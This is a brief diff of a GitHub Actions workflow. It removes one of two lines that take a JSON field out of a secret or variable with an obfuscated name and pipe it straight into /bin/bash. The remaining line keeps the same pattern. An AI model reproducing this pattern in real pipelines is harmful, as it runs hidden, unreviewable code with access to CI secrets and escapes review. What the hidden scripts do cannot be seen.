@@ -20,7 +20,6 @@ jobs:
           icszb3731: ${{ secrets.icszb3731 }}
         run: |
           printf '%s' "$icszb3731" | jq -r .z98308 | /bin/bash
-          printf '%s' "$p702" | jq -r .v3 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
